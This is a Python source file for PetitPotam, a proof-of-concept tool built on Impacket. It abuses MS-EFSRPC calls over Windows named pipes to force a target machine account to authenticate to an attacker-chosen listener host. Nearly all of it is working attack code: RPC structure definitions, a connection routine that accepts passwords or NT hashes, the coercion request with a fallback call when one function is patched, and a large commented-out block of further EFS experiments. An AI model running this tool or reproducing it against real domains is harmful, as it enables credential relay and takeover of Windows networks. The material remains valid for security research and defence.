#!/usr/bin/env python
# 
# Author: GILLES Lionel aka topotam (@topotam77)
# 
# Greetz : grenadine(@Greynardine), skar(@__skar), didakt(@inf0sec1), plissken, pixis(@HackAndDo)
# "Most of" the code stolen from dementor.py from @3xocyte ;)


import sys
import argparse

from impacket import system_errors
from impacket.dcerpc.v5 import transport, scmr
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR, LPBYTE, NDRPOINTERNULL
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
from impacket.uuid import uuidtup_to_bin


show_banner = '''
                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN


'''

class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__( self ):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
            return 'EFSR SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return 'EFSR SessionError: unknown error code: 0x%x' % self.error_code


################################################################################
# STRUCTURES
################################################################################
class EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):
    align = 1
    structure = (
        ('Data', '20s'),
    )
class EFS_EXIM_PIPE(NDRSTRUCT):
    align = 1
    structure = (
        ('Data', ':'),
    )
class EFS_HASH_BLOB(NDRSTRUCT):
    
    structure = (
        ('Data', DWORD),
        ('cbData', PCHAR),
    )
class EFS_RPC_BLOB(NDRSTRUCT):
    
    structure = (
        ('Data', DWORD),
        ('cbData', PCHAR),
    )
    
class EFS_CERTIFICATE_BLOB(NDRSTRUCT):
    structure = (
        ('Type', DWORD),
        ('Data', DWORD),
        ('cbData', PCHAR),
    )    
class ENCRYPTION_CERTIFICATE_HASH(NDRSTRUCT):
    structure = (
        ('Lenght', DWORD),
        ('SID', RPC_SID),
        ('Hash', EFS_HASH_BLOB),
        ('Display', LPWSTR),
    )   
class ENCRYPTION_CERTIFICATE(NDRSTRUCT):
    structure = (
        ('Lenght', DWORD),
        ('SID', RPC_SID),
        ('Hash', EFS_CERTIFICATE_BLOB),
   
    )   
class ENCRYPTION_CERTIFICATE_HASH_LIST(NDRSTRUCT):
    align = 1
    structure = (
        ('Cert', DWORD),
        ('Users', ENCRYPTION_CERTIFICATE_HASH),
    )
class ENCRYPTED_FILE_METADATA_SIGNATURE(NDRSTRUCT):    
    structure = (
        ('Type', DWORD),
        ('HASH', ENCRYPTION_CERTIFICATE_HASH_LIST),
        ('Certif', ENCRYPTION_CERTIFICATE),
        ('Blob', EFS_RPC_BLOB),
    )   
class EFS_RPC_BLOB(NDRSTRUCT):
    structure = (
        ('Data', DWORD),
        ('cbData', PCHAR),
    )
class ENCRYPTION_CERTIFICATE_LIST(NDRSTRUCT):
    structure = (
        ('nUsers', DWORD),
        ('Users', ENCRYPTION_CERTIFICATE_HASH),
    )

class ENCRYPTION_PROTECTOR_LIST(NDRSTRUCT):
    structure = (
        ('Data', DWORD)
    )


################################################################################
# RPC CALLS
################################################################################
class EfsRpcOpenFileRaw(NDRCALL):
    opnum = 0
    structure = (
        ('FileName', WSTR), 
        ('Flag', ULONG),
    )

class EfsRpcOpenFileRawResponse(NDRCALL):
    structure = (
        ('hContext', EXIMPORT_CONTEXT_HANDLE),
        ('ErrorCode', ULONG),
    )

class EfsRpcReadFileRaw(NDRCALL):
    opnum = 1
    structure = (
        ('hContext', EXIMPORT_CONTEXT_HANDLE),
    )

class EfsRpcReadFileRawResponse(NDRCALL):
    structure = (
        ('EfsOutPipe', EFS_EXIM_PIPE),
    )

class EfsRpcWriteFileRaw(NDRCALL):
    opnum = 2
    structure = (
        ('hContext', EXIMPORT_CONTEXT_HANDLE),
        ('EfsInPipe', EFS_EXIM_PIPE),
    )

class EfsRpcWriteFileRawResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )

class EfsRpcCloseRaw(NDRCALL):
    opnum = 3
    structure = (
        ('hContext', EXIMPORT_CONTEXT_HANDLE),
    )

class EfsRpcCloseRawResponse(NDRCALL):
    structure = (
    )

class EfsRpcEncryptFileSrv(NDRCALL):
    opnum = 4
    structure = (
        ('FileName', WSTR),
    )

class EfsRpcEncryptFileSrvResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )

class EfsRpcDecryptFileSrv(NDRCALL):
    opnum = 5
    structure = (
        ('FileName', WSTR),
        ('Flag', ULONG),
    )

class EfsRpcDecryptFileSrvResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcQueryUsersOnFile(NDRCALL):
    opnum = 6
    structure = (
        ('FileName', WSTR),
        
    )
class EfsRpcQueryUsersOnFileResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcQueryRecoveryAgents(NDRCALL):
    opnum = 7
    structure = (
        ('FileName', WSTR),
        
    )
class EfsRpcQueryRecoveryAgentsResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcRemoveUsersFromFile(NDRCALL):
    opnum = 8
    structure = (
        ('FileName', WSTR),
        ('Users', ENCRYPTION_CERTIFICATE_HASH_LIST)
        
    )
class EfsRpcRemoveUsersFromFileResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcAddUsersToFile(NDRCALL):
    opnum = 9
    structure = (
        ('FileName', WSTR),
        ('EncryptionCertificates', ENCRYPTION_CERTIFICATE_LIST)
    )
class EfsRpcAddUsersToFileResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )    
class EfsRpcFileKeyInfo(NDRCALL):
    opnum = 12
    structure = (
        ('FileName', WSTR),
        ('InfoClass', DWORD),
    )
class EfsRpcFileKeyInfoResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcDuplicateEncryptionInfoFile(NDRCALL):
    opnum = 13
    structure = (
        ('SrcFileName', WSTR),
        ('DestFileName', WSTR),
        ('dwCreationDisposition', DWORD),
        ('dwAttributes', DWORD),
        ('RelativeSD', EFS_RPC_BLOB),
        ('bInheritHandle', BOOL),
    ) 
class EfsRpcDuplicateEncryptionInfoFileResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )

class EfsRpcAddUsersToFileEx(NDRCALL):
    opnum = 15
    structure = (
        ('dwFlags', DWORD),
        ('Reserved', NDRPOINTERNULL),
        ('FileName', WSTR),
        ('EncryptionCertificates', ENCRYPTION_CERTIFICATE_LIST),
    ) 
class EfsRpcAddUsersToFileExResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )
    
class EfsRpcFileKeyInfoEx(NDRCALL):
    opnum = 16
    structure = (
        ('dwFileKeyInfoFlags', DWORD),
        ('Reserved', NDRPOINTERNULL),
        ('FileName', WSTR),
        ('InfoClass', DWORD),
    )
class EfsRpcFileKeyInfoExResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcGetEncryptedFileMetadata(NDRCALL):
    opnum = 18
    structure = (
        ('FileName', WSTR),
    )
class EfsRpcGetEncryptedFileMetadataResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )   
class EfsRpcSetEncryptedFileMetadata(NDRCALL):
    opnum = 19
    structure = (
        ('FileName', WSTR),
        ('OldEfsStreamBlob', EFS_RPC_BLOB),
        ('NewEfsStreamBlob', EFS_RPC_BLOB),
        ('NewEfsSignature', ENCRYPTED_FILE_METADATA_SIGNATURE),
    )
class EfsRpcSetEncryptedFileMetadataResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcEncryptFileExSrv(NDRCALL):
    opnum = 21
    structure = (
        ('FileName', WSTR),
        ('ProtectorDescriptor', WSTR),
        ('Flags', ULONG),
    )
class EfsRpcEncryptFileExSrvResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )

class EfsRpcQueryProtectors(NDRCALL):
    opnum = 22
    structure = (
        ('FileName', WSTR),
    )
class EfsRpcQueryProtectorsResponse(NDRCALL):
    structure = (
        ('ppProtectorList', ENCRYPTION_PROTECTOR_LIST),
    )

################################################################################
# OPNUMs and their corresponding structures
################################################################################
OPNUMS = {
    0   : (EfsRpcOpenFileRaw, EfsRpcOpenFileRawResponse),
    1   : (EfsRpcReadFileRaw, EfsRpcReadFileRawResponse),
    2   : (EfsRpcWriteFileRaw, EfsRpcWriteFileRawResponse),
    3   : (EfsRpcCloseRaw, EfsRpcCloseRawResponse),
    4   : (EfsRpcEncryptFileSrv, EfsRpcEncryptFileSrvResponse),
    5   : (EfsRpcDecryptFileSrv, EfsRpcDecryptFileSrvResponse),
    6   : (EfsRpcQueryUsersOnFile, EfsRpcQueryUsersOnFileResponse),
    7   : (EfsRpcQueryRecoveryAgents, EfsRpcQueryRecoveryAgentsResponse),
    8   : (EfsRpcRemoveUsersFromFile, EfsRpcRemoveUsersFromFileResponse),
    9   : (EfsRpcAddUsersToFile, EfsRpcAddUsersToFileResponse),
    12   : (EfsRpcFileKeyInfo, EfsRpcFileKeyInfoResponse),
    13   : (EfsRpcDuplicateEncryptionInfoFile, EfsRpcDuplicateEncryptionInfoFileResponse),
    15   : (EfsRpcAddUsersToFileEx, EfsRpcAddUsersToFileExResponse),
    16   : (EfsRpcFileKeyInfoEx, EfsRpcFileKeyInfoExResponse),
    18   : (EfsRpcGetEncryptedFileMetadata, EfsRpcGetEncryptedFileMetadataResponse),
    19   : (EfsRpcSetEncryptedFileMetadata, EfsRpcSetEncryptedFileMetadataResponse),
    21   : (EfsRpcEncryptFileExSrv, EfsRpcEncryptFileExSrvResponse),
    22   : (EfsRpcQueryProtectors, EfsRpcQueryProtectorsResponse),
}
 
class CoerceAuth():
    def connect(self, username, password, domain, lmhash, nthash, target, pipe, doKerberos, dcHost, targetIp):
        binding_params = {
            'lsarpc': {
                'stringBinding': r'ncacn_np:%s[\PIPE\lsarpc]' % target,
                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
            },
            'efsr': {
                'stringBinding': r'ncacn_np:%s[\PIPE\efsrpc]' % target,
                'MSRPC_UUID_EFSR': ('df1941c5-fe89-4e79-bf10-463657acf44d', '1.0')
            },
            'samr': {
                'stringBinding': r'ncacn_np:%s[\PIPE\samr]' % target,
                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
            },
            'lsass': {
                'stringBinding': r'ncacn_np:%s[\PIPE\lsass]' % target,
                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
            },
            'netlogon': {
                'stringBinding': r'ncacn_np:%s[\PIPE\netlogon]' % target,
                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
            },
        }
        print(binding_params[pipe]['stringBinding'])
        rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]['stringBinding'])
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)

        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
        if targetIp:
            rpctransport.setRemoteHost(targetIp)

        dce = rpctransport.get_dce_rpc()
        dce.set_auth_type(RPC_C_AUTHN_WINNT)
        #dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        print("[-] Connecting to %s" % binding_params[pipe]['stringBinding'])
        try:
            dce.connect()
        except Exception as e:
            print("Something went wrong, check error status => %s" % str(e))  
            #sys.exit()
            #return
        print("[+] Connected!")
        print("[+] Binding to %s" % binding_params[pipe]['MSRPC_UUID_EFSR'][0])
        try:
            dce.bind(uuidtup_to_bin(binding_params[pipe]['MSRPC_UUID_EFSR']))
        except Exception as e:
            print("Something went wrong, check error status => %s" % str(e)) 
            #sys.exit()
            #return
        print("[+] Successfully bound!")
        return dce
        
    def EfsRpcOpenFileRaw(self, dce, listener):
        print(listener)
        BASIC_KEY_INFO = 0x00000001
        CHECK_COMPATIBILITY_INFO = 0x00000002
        UPDATE_KEY_USED = 0x00000100
        CHECK_DECRYPTION_STATUS = 0x00000200
        CHECK_ENCRYPTION_STATUS = 0x00000400
        request = EfsRpcFileKeyInfoEx()
        request['dwFileKeyInfoFlags'] = '0'
        request['InfoClass'] = 0
        request['FileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
        resp = dce.request(request)
        resp.dump()
        try:
            '''
            BASIC_KEY_INFO = 0x00000001
            CHECK_COMPATIBILITY_INFO = 0x00000002
            UPDATE_KEY_USED = 0x00000100
            CHECK_DECRYPTION_STATUS = 0x00000200
            CHECK_ENCRYPTION_STATUS = 0x00000400
            request = EfsRpcFileKeyInfoEx()
            request['dwFileKeyInfoFlags'] = '0'
            request['InfoClass'] = 0
            request['FileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
            resp = dce.request(request)
            resp.dump()

            EFSRPC_ADDUSERFLAG_ADD_POLICY_KEYTYPE = 0x00000002
            EFSRPC_ADDUSERFLAG_REPLACE_DDF = 0x00000004
            request = EfsRpcAddUsersToFileEx()
            request['dwFlags'] = EFSRPC_ADDUSERFLAG_ADD_POLICY_KEYTYPE
            request['FileName'] = '\\\\192.168.85.128\\C$\\Users\\Public\\test.txt\x00'
            resp = dce.request(request)
            print(resp)
            resp.dump()
            
            request = EfsRpcDecryptFileSrv()
            request['FileName'] = '\\\\192.168.85.128\\C$\\Users\\Public\\test.txt\x00'
            resp = dce.request(request)
            resp.dump()

            request = EfsRpcEncryptFileSrv()
            request['FileName'] = '\\\\localhost\\C$\\Users\\Public\\test.txt\x00'
            resp = dce.request(request)
            resp.dump()

            request = EfsRpcOpenFileRaw()
            request['FileName'] = '\\\\localhost\\C$\\Users\\Public\\test.txt\x00'
            request['Flag'] = 1
            resp = dce.request(request)
            src_file_context = resp['hContext']

            request = EfsRpcReadFileRaw()
            request['hContext'] = src_file_context
            resp = dce.request(request)
            encrypted_data = resp['EfsOutPipe']
            resp.dump()
            print(request['hContext'])

            request = EfsRpcCloseRaw()
            request['hContext'] = src_file_context
            resp = dce.request(request)
            resp.dump()
            print(request['hContext'])
            
            # Create file when flag = 1
            request = EfsRpcOpenFileRaw()
            request['FileName'] = '\\\\localhost\\C$\\testba.txt\x00'
            request['Flag'] = 1
            resp = dce.request(request)
            #resp.dump()

            # Write file
            request = EfsRpcWriteFileRaw()
            print("aaa")
            print(resp['hContext'])
            #encrypted_data = b'2\x00\x00\x00\x00\x01\x00\x00R\x00O\x00B\x00S\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1e\x00\x00\x00N\x00T\x00F\x00S\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x10\x19\xfd\x10\xb0\x02\x00\x00\xb0\x02\x00\x00G\x00U\x00R\x00E\x00\x00\x00\x00\x00\xa0\x02\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x95\xc3\xba9ljzB\xaf\x87|7\xfa\t,\xdf\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00T\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00H\x02\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00H\x01\x00\x00\x00\x00\x00\x004\x01\x00\x00\x1c\x00\x00\x00\x03\x00\x00\x00\xfc\x00\x00\x008\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00#"YZ\x1f\xd5\xaaljX\xea\xafR\x04\x00\x00\x14\x00\x00\x00\x14\x00\x00\x00(\x00\x00\x00r\x00\x00\x00\xd0\x00\x00\x00\xdf\xb5\x13\x1b\xd7K\xc8\xb7\n\x93U5^\x9b@R\x06\x91ff4\x000\x003\x008\x005\x00c\x00a\x002\x00-\x008\x00f\x008\x001\x00-\x004\x00f\x007\x00b\x00-\x009\x00e\x00f\x000\x00-\x000\x009\x009\x007\x00e\x005\x008\x000\x005\x00e\x005\x005\x00\x00\x00M\x00i\x00c\x00r\x00o\x00s\x00o\x00f\x00t\x00 \x00E\x00n\x00h\x00a\x00n\x00c\x00e\x00d\x00 \x00C\x00r\x00y\x00p\x00t\x00o\x00g\x00r\x00a\x00p\x00h\x00i\x00c\x00 \x00P\x00r\x00o\x00v\x00i\x00d\x00e\x00r\x00 \x00v\x001\x00.\x000\x00\x00\x00x\x00i\x00a\x00o\x00l\x00i\x00(\x00x\x00i\x00a\x00o\x00l\x00i\x00@\x00X\x00I\x00A\x00O\x00L\x00I\x00)\x00\x00\x00\'#\x82\x8e\xd3\xac\xb4\xb5\x97\x0fS\x91V7\x0eXh\x07\xfe\xd9\x13\x0f6qy\x92\xf3\xec\xd7]a\xba\xeb\xefQZti4s\xf7\xe7\xc8\xf0\xe8"~\xdd\xf9\xd2\xd7\x97&#>\xcd\xf5\xb4\x9a\xb3#R\xd5\x89p\xed9&\xba{\x18\x1c\xdf8\x13\x98\xb1\x9d\x15\xe0\x13\x0b\xb1\xbd\xdc\x92\xb6\xccA\x80$\x02\xa2\xcf\xe4\x04QXy\x04\x97\xbf\xc4=\xc6\xe1\x13\xec}\xa4\xd5\xcf\x11\xe9(\xe3\x02(`\x9c\xa1\xba\x9d\xf9\xd7n\x82\xec\xc12\xc6\x93"\xfcN\x02\xfb\xa4\x98\xae\xc5\x1c\x95S\xc6g\xaf}w\xf2;,_\xc9\n\x9c\xfd\x07\xcd+\x8dX\xd1w\xe2\xee0\x06\x86\xb3\x87\x07\xdd3r\xc6\xcb\xe8\x915\xa4H> \xb9&\x7f\xfc\xd0\xa7\x18\xee\x18\xe7]&\xd3\xd5\xa9cP\xe7\x1dc\x9a\xd4o\xd98\x15I\xe2\xb2\xea@\x1d#\x1a\xdf\xb5J|\xbd\xdb\x0fb\xb93Z\x9a\x06\x04\x1a<\xf3\xf0\x9dI\x9bx1\xb3_pO>\xa9\x17\xc6 \xb9\xa9\xc8g\xbak*\x00\x00\x00*\x00\x00\x00N\x00T\x00F\x00S\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x00\x00:\x00:\x00$\x00D\x00A\x00T\x00A\x00\xa7P\x00\x04\x00\x00\x00\x04\x00\x00G\x00U\x00R\x00E\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf0\x01\x00\x00\x0c\x00\x00\x00\x0c\x00\x00\x00\x00\x00\t\t\x0c\x01\x01\x00\x00\x02\x00\x00EXTD\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00V\xd0w\xbcp\xd1\x92\xdf\x07F\xaf\x9a\x9e>\x93\xe2`\xccq^\x12|\xcb)\xe1\xfd\x04\xdca\xb4\x92Q_\xcbQ\xdb\x1c\x83\x0f\xe5\xa3o\xea\xaa\xf5\x82\x86aV4\x10\x17\xcd\xeb5\xc5\xca\xdb1\x9fF\xac\xa0\x15,H\xa4\xc1\x80c\xbe\xfc\xc6\x12\xe1\x1a-\xb2"\xf5\xd5\xf9\xe0\xed,Q9\xd2[\x96\xd8\xcf\x9cs\'Ef\t\xab]Z\x87\xbba\xe45\xf4\x1b\xe6rZ0\x87\xb2\x1e\xca\x85\xac\xc2\xe5\xcf\xdc\x03\xf9\x99\xfeT\x02\xca\x1fP=\xb1\x9a\xd2e\xa5\xc0\x0et\xfe\xcc\x9b^\xd2\x0e\x0e8\ta\x87\t\xd5o\xfd\xfc?>\x9bd\xa7eV\x11\xfe\xaf\xff5\xcb)\x04\xf1T\xfdo$YX\xa1\x1f\xacW \xa0\x84K/\xee\xc0\x1b\xba\xdd\x89\xbc\x90\x97\xba\xf8N\xcf6\xcd^NG$C\xa2\xa0^\xecz\x16jU\x0c\x92\x86\x1by\xec\xa5#[\xebc\xed\xb6\x18\xe6\xf04\xff\tT-q\xff|\x059\x0e\xef\x12rx^\x9d8c\xca{\'\xcb\x89\x93Pk|*\x99\xe1\x15`_0\xa9\xee\xba0H\xa3\x92i\xf0\x96\xd0\r\x17\x84\xcdZ\x81!\xa8\xce\xeb\xff\xf2\xf7\'\x94\xd6t`?I>\xe9]\xb6=\x14i\xf8\x11\x04^\xf3N@\xcc\x9a\xe5\xa0d\xaa@\xf3\x04\xae(\xba\x97\xad[x\xc4\xafl\xde\xf5\xa9\xb3T\xcb\x8d\x9dm\xb1\x18\x14K\xc7i3\xbb\x9fs\x01^\x8e\x9b\x9bwq\xf4R\xa5A\x15`\x10\x81:\xf0U+*5/\x91\xd0\xd1c\xc5M\xbf\x0fN\xc0xMc\x8d\x92\xf4(\x9f\x94\x16;@=x\xc3\x91U\x11w\xfe\xf0R\xd1JG\xd7f\xf4\xb6@^\x10\xc9B@\x8b \xc2C\x8a\x03)Cv\x03\xbd\x15KQ\x8dH\xad\x8b\'\xf6\xe97\x0c\xc6\xb2\xac\xf6\x01b=\xc7\xd92\x96\xe3\xc8-aa\x11iP\xf6Nq9\xcf\xa8k8\x0f\x02\xa5z\xdd\x95\xf54P{\xf1\x07\xc8 u\xdbI\xb7\x82\xa2b\xc6b\xfd\x10M02Tl\xea\xb3\xcf<\x1a\x9b\xe8\xc1\t\xd1\xa3\xd3\xb5>\xecU\x00\x00\x00\x00\x00\x00\x00\x00'
            dst_file_context = resp['hContext']
            request['hContext'] = dst_file_context
            request['EfsInPipe'] = encrypted_data
            resp = dce.request(request)
            resp.dump()

            request = EfsRpcCloseRaw()
            request['hContext'] = dst_file_context
            resp = dce.request(request)
            resp.dump()

            request = EfsRpcDecryptFileSrv()
            request['FileName'] = '\\\\localhost\\C$\\Users\\Public\\test.txt\x00'
            resp = dce.request(request)
            resp.dump()
            
            request = EfsRpcDecryptFileSrv()
            request['FileName'] = '\\\\localhost\\C$\\testba.txt\x00'
            resp = dce.request(request)
            resp.dump()
            '''
            
        except Exception as e:
            print(str(e))
            if str(e).find('ERROR_BAD_NETPATH') >= 0:
                print('[+] Got expected ERROR_BAD_NETPATH exception!!')
                print('[+] Attack worked!')
                #sys.exit()
                return None
            if str(e).find('rpc_s_access_denied') >= 0:
                print('[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!')
                print('[+] OK! Using unpatched function!')
                print("[-] Sending EfsRpcEncryptFileSrv!")
                try:
                    request = EfsRpcEncryptFileSrv()
                    request['FileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
                    resp = dce.request(request)
                except Exception as e:
                    if str(e).find('ERROR_BAD_NETPATH') >= 0:
                        print('[+] Got expected ERROR_BAD_NETPATH exception!!')
                        print('[+] Attack worked!')
                        pass
                    else:
                        print("Something went wrong, check error status => %s" % str(e)) 
                        return None
                        #sys.exit()
                
            else:
                print("Something went wrong, check error status => %s" % str(e)) 
                return None
                #sys.exit()

def main():
    parser = argparse.ArgumentParser(add_help = True, description = "PetitPotam - rough PoC to connect to lsarpc and elicit machine account authentication via MS-EFSRPC EfsRpcOpenFileRaw()")
    parser.add_argument('-u', '--username', action="store", default='', help='valid username')
    parser.add_argument('-p', '--password', action="store", default='', help='valid password (if omitted, it will be asked unless -no-pass)')
    parser.add_argument('-d', '--domain', action="store", default='', help='valid domain name')
    parser.add_argument('-hashes', action="store", metavar="[LMHASH]:NTHASH", help='NT/LM hashes (LM hash can be empty)')

    parser.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    parser.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                        '(KRB5CCNAME) based on target parameters. If valid credentials '
                        'cannot be found, it will use the ones specified in the command '
                        'line')
    parser.add_argument('-dc-ip', action="store", metavar="ip address", help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter')
    parser.add_argument('-target-ip', action='store', metavar="ip address",
                        help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                        'This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it')

    parser.add_argument('-pipe', action="store", choices=['efsr', 'lsarpc', 'samr', 'netlogon', 'lsass', 'all'], default='lsarpc', help='Named pipe to use (default: lsarpc) or all')
    parser.add_argument('listener', help='ip address or hostname of listener')
    parser.add_argument('target', help='ip address or hostname of target')
    options = parser.parse_args()

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    print(show_banner)

    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True:
        from getpass import getpass
        options.password = getpass("Password:")
    
    plop = CoerceAuth()
    
    if options.pipe == "all":
        all_pipes = ['efsr', 'lsarpc', 'samr', 'netlogon', 'lsass']
    else:
        all_pipes = [options.pipe]
    
    for all_pipe in all_pipes:
        print("Trying pipe", all_pipe)
        dce = plop.connect(username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=options.target, pipe=all_pipe, doKerberos=options.k, dcHost=options.dc_ip, targetIp=options.target_ip)
        if dce is not None:
            plop.EfsRpcOpenFileRaw(dce, options.listener)
            dce.disconnect()
    sys.exit()   
             
if __name__ == '__main__':
    main()
